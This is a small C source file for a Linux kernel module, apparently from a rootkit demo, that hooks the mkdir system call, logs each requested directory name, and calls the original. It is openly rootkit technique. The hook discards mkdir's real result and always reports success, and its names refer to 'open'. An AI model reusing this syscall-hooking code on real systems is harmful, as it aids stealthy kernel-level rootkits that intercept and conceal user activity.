#include "syscall_hooking.h"

struct hooked_syscall nr_open;

typedef asmlinkage long (*orig_mkdir_t)(const struct pt_regs *);
orig_mkdir_t orig_mkdir;

asmlinkage int hook_mkdir(const struct pt_regs *regs)
{
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0)
        printk(KERN_INFO "rootkit: Trying to create directory with name: %s\n", dir_name);

    orig_mkdir(regs);
    return 0;
}

int init_open_hook (void){

	nr_open.syscall = __NR_mkdir;
	nr_open.fake_syscall = &hook_mkdir;

	orig_mkdir = (orig_mkdir_t)hook_syscall(&nr_open);
	return 1;
}

int exit_open_hook (void){

	reset_syscall(&nr_open);
	return 1;
}